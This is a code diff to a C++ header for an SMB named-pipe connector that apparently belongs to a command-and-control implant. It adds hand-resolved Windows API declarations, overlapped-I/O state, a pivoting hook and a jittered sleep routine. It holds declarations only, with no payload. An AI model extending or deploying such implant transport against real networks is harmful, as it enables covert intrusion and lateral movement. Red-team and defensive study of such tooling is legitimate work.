@@ -48,11 +48,16 @@ struct SMBFUNC {
 	DECL_API(NtClose);
 
 	//kernel32
+	DECL_API(CancelIo);
 	DECL_API(ConnectNamedPipe);
 	DECL_API(DisconnectNamedPipe);
 	DECL_API(CreateNamedPipeA);
 	DECL_API(FlushFileBuffers);
-	DECL_API(PeekNamedPipe);
+	DECL_API(GetOverlappedResult);
+	DECL_API(CreateEventA);
+	DECL_API(SetEvent);
+	DECL_API(ResetEvent);
+	DECL_API(WaitForMultipleObjects);
 
 	//advapi32
 	DECL_API(AllocateAndInitializeSid);
@@ -61,6 +66,8 @@ struct SMBFUNC {
 	DECL_API(SetEntriesInAclA);
 	DECL_API(SetSecurityDescriptorDacl);
 };
+
+class Pivotter;
 
 class ConnectorSMB : public Connector
 {
@@ -74,11 +81,22 @@ class ConnectorSMB : public Connector
 
 	HANDLE hChannel = nullptr;
 
-	BYTE* beat     = nullptr;
-	ULONG beatSize = 0;
+	BYTE* beat      = nullptr;
+	ULONG beatSize  = 0;
 	BOOL  connected = FALSE;
 
+	HANDLE hTermEvent = nullptr;
+
+	OVERLAPPED ovRead    = {};
+	DWORD      rdHeader  = 0;
+	BOOL       rdPending = FALSE;
+
+	HANDLE hWriteEvent = nullptr;
+
+	Pivotter* pivotter = nullptr;
+
 public:
+	void SetPivotter(Pivotter* p) override { this->pivotter = p; }
 	ConnectorSMB();
 
 	BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
@@ -92,13 +110,15 @@ public:
 	int   RecvSize() override;
 	void  RecvClear() override;
 
-	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override {}
+	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput, DWORD pollIntervalMs = 0) override;
 
 	static void* operator new(size_t sz);
 	static void operator delete(void* p) noexcept;
 
 private:
 	void SendData(BYTE* data, ULONG data_size);
+	void ReadIncoming();
 	void Listen();
 	void DisconnectInternal();
+	void PostHeaderRead();
 };
